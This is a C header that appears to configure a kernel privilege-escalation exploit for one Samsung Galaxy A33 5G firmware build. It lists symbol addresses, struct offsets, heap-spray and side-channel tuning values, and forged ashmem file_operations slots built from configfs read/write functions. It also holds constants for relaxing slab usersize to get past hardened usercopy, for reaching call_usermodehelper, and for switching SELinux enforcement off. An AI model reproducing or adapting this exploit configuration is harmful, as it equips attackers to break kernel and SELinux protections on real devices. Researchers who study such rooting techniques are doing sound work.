#ifndef ROOT_MY_GALAXY_TARGET_H
#define ROOT_MY_GALAXY_TARGET_H

/*
 * Galaxy A33 5G (a33x, Exynos 1280 / s5e8825), firmware A336EDXSFGYL1.
 *
 * Every value below was derived from this exact build:
 *   kernel  5.10.237-android12-9-31999025-abA336EDXSFGYL1
 *   Image   34,048,512 bytes, SHA-256
 *           519974B090DC8625085BEB0723CDED3EF3CB0A10BACDCDB195D18C270361C27B
 *   base    0xffffffc008000000 (vmlinux-to-elf, kallsyms)
 *
 * Symbol offsets come from the recovered symbol table, struct offsets from
 * the disassembly of the functions that touch them, and the memory windows
 * from the live device (/proc/device-tree node names plus
 * /sys/devices/system/memory block indices).  This kernel has no BTF; see
 * docs/SM-A336E-A336EDXSFGYL1.md for the exact evidence per value.
 */

#define TARGET_MODEL "SM-A336E"
#define TARGET_BUILD "A336EDXSFGYL1"
#define TARGET_KERNEL_RELEASE \
    "5.10.237-android12-9-31999025-abA336EDXSFGYL1"

#define PAGE_SIZE 4096
/*
 * Measured on this unit: slide 0x1e0000 on three consecutive probes, 32 KiB
 * aligned.  The scan cost scales with the slide, not with this bound, so the
 * bound is set well above the observed value (low DRAM bank is 2 GiB).
 */
#define MAX_PHYSICAL_SLIDE 0x8000000ULL
#define PHYSICAL_SLIDE_ALIGNMENT 0x8000ULL
#define PHYS_OFFSET 0x80000000ULL
#define PAGE_OFFSET 0xffffff8000000000ULL

/*
 * DRAM map of this unit (6 GiB): low bank 2 GiB at 0x80000000
 * (/proc/device-tree/memory@80000000) and high bank 4 GiB at 0x880000000
 * (/proc/device-tree/memory@880000000, blocks memory272..memory303).  The
 * alias windows are PAGE_OFFSET + (phys - PHYS_OFFSET); the Normal window
 * keeps one extra 2 GiB of headroom for 8 GiB variants of the same model.
 */
#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START 0xffffff8800000000ULL
#define MM_NORMAL_ALIAS_END 0xffffff8980000000ULL

#define KERNEL_TEXT_MIN 0xffffffc000000000ULL
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define INIT_MM_IMAGE 0xffffffc009f64f38ULL
#define MM_PGD_OFF 0x48ULL

/* sizeof(struct mm_struct) and SLUB geometry, from mm_cache_init(). */
#define MM_STRUCT_SZ 0x3c0
#define MM_ORDER 3
#define MM_PARTIALS 5
#define APPENDED_FUTEXES 2048
#define REPEAT_MEASUREMENT 64
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1

/*
 * Reclaim tuning.  These are allocator/scheduler ratios rather than firmware
 * addresses; they are inherited from the A536E profile, which shares this
 * kernel branch and SoC family, and remain subject to hardware validation.
 */
#define A33X_PAGE_SCAN_MAX 256
#define A33X_DMA32_SKIP_SLABS 8
#define A33X_TRIGGER_SLABS 24
#define A33X_SKB_SENDS 256
#define A33X_SKB_SNDBUF 8388608

#define KERNELSNITCH_IDENTITY_WINDOWS { \
    { MM_DMA32_ALIAS_START, MM_DMA32_ALIAS_END }, \
    { MM_NORMAL_ALIAS_START, MM_NORMAL_ALIAS_END }, \
}

#define INIT_TASK_BASE 0xffffff8001e0dd00ULL
#define SELINUX_STATE_ALIAS 0xffffff80021ddb68ULL
#define ASHMEM_MISC_FOPS_ALIAS 0xffffff8001ffbbe0ULL
#define ASHMEM_FOPS_IMAGE 0xffffffc009b08858ULL
#define SYSTEM_UNBOUND_WQ_ALIAS 0xffffff8001df9e10ULL
/*
 * workqueue.c pwq_cache (the pool_workqueue slab cache), at text
 * 0xffffffc00a07fca8 among wq_unbound_cpumask/unbound_std_wq_attrs/
 * unbound_pool_hash.  The recovered symbol table has a second symbol also
 * named pwq_cache at 0xffffffc009dfcb78 (fs/eventpoll.c, the eppoll_entry
 * cache next to epi_cache); that one is NOT this cache and relaxing its
 * usersize leaves pwq->pool reads aborting in hardened usercopy.
 */
#define PWQ_CACHE_ALIAS 0xffffff800207fca8ULL
/*
 * kmalloc_caches[type][index]; kmalloc_slab uses a 0x70-byte stride per
 * type (14 entries) and type = (gfp >> 4) & 1, so GFP_KERNEL is type 0.
 * alloc_workqueue() sizes its object as 0x148 for WQ_UNBOUND queues
 * (`csel x0, #0x140, #0x148` on the WQ_UNBOUND bit), so every unbound
 * workqueue_struct — including system_unbound_wq — comes from kmalloc-512
 * (index 9).  Reading wq->dfl_pwq through copy_to_user needs that cache's
 * usersize relaxed, otherwise hardened usercopy aborts.
 */
#define KMALLOC_CACHES_ALIAS 0xffffff8001b4e300ULL
#define KMALLOC_512_INDEX_OFF 0x48ULL
#define CALL_USERMODEHELPER_EXEC_WORK_IMAGE 0xffffffc0080f6be4ULL

/*
 * selinux_state.enforcing is byte 0 (sel_write_enforce reads it with ldarb
 * at offset 0); checkreqprot is byte 1 and initialized is byte 2.  This qword
 * therefore yields enforcing=0, checkreqprot=0, initialized=1.
 */
#define SELINUX_LIVE_QWORD 0x0000000000010000ULL

/* struct configfs_buffer, from configfs_read_file/configfs_write_bin_file. */
#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x50
#define CFG_BIN_BUFFER_OFF 0x58
#define CFG_BIN_BUFFER_SIZE_OFF 0x60
#define CFG_CB_MAX_SIZE_OFF 0x64

/* struct kmem_cache.usersize, from __check_heap_object. */
#define KMEM_CACHE_USERSIZE_OFF 0xf8

/* workqueue_struct/pool_workqueue/worker_pool/work_struct, verified against
 * __queue_work, apply_wqattrs_commit and call_usermodehelper_exec_work. */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x58
#define PWQ_MAX_ACTIVE_OFF 0x5c
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/*
 * Forged file_operations slots.  The real ashmem_fops object at
 * 0xffffffc009b08858 supplies 0x50..0xe0; the read/write primitives use
 * configfs_read_file (buffer->page) and configfs_write_bin_file
 * (buffer->bin_buffer), and llseek is noop_llseek.
 */
#define ASHMEM_FOPS_08_IMAGE 0xffffffc0083789dcULL
#define ASHMEM_FOPS_10_IMAGE 0xffffffc00844771cULL
#define ASHMEM_FOPS_18_IMAGE 0xffffffc008447b7cULL
#define ASHMEM_FOPS_50_IMAGE 0xffffffc008c37708ULL
#define ASHMEM_FOPS_58_IMAGE 0xffffffc008c3805cULL
#define ASHMEM_FOPS_60_IMAGE 0xffffffc008c380b4ULL
#define ASHMEM_FOPS_70_IMAGE 0xffffffc008c382e4ULL
#define ASHMEM_FOPS_80_IMAGE 0xffffffc008c38368ULL
#define ASHMEM_FOPS_C8_IMAGE 0xffffffc0083c3ad8ULL
#define ASHMEM_FOPS_E0_IMAGE 0xffffffc008c38488ULL

#endif
